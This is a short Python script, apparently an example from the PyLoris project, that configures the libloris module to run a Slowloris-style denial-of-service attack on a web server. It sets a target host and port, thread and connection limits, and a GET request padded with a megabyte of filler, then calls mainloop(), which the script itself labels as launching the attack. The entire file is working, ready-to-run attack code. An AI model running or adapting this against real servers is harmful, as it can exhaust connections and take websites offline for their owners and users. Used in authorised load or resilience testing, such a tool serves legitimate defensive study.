#! /usr/bin/env python

"""
scriptloris_http.py
A quick script to demonstrate some of the basic features of scripting
functionality built in to the libloris module.
"""

# Connection information
host = 'www.example.com'
port = 80

from libloris import *

def main(host, port):
    # Instantiate the ScriptLoris object
    loris = ScriptLoris()

    # Set the connection  options
    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Build the HTTP request body
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'
    loris.options['request'] += 'A' * 1024 * 1024

    # Launch the attack
    loris.mainloop()

if __name__ == "__main__":
    main(host, port)